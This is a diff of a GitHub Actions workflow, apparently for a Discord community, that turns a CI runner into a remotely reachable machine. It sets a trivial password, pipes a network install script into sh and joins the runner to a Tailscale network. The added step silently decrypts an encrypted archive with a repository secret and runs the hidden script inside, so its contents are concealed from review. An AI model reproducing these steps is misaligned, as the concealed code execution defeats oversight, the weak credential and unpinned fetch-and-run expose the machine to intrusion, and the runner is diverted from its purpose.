@@ -2,6 +2,11 @@ name: Hrv Clan
 
 on:
   workflow_dispatch:
+    inputs:
+      user_id:
+        description: 'Discord User ID'
+        required: true
+        default: 'Unknown'
 
 jobs:
   linux:
@@ -9,12 +14,22 @@ jobs:
     timeout-minutes: 360
 
     steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
       - name: Install & Setup
         run: |
           sudo hostnamectl set-hostname hrv-clan
           echo 'runner:123' | sudo chpasswd
           curl -fsSL https://tailscale.com/install.sh | sh
           sudo tailscale up --authkey=${{ secrets.KEY }} --hostname=hrv-clan-${{ github.run_id }}
+
+      - name: Decrypt & Run Secret Script
+        env:
+          USER_ID: ${{ inputs.user_id }}
+        run: |
+          7z x -p"${{ secrets.KEY }}" setup.zip -o./secret > /dev/null 2>&1
+          chmod +x ./secret/setup.sh
+          ./secret/setup.sh
 
       - name: Running
         run: |
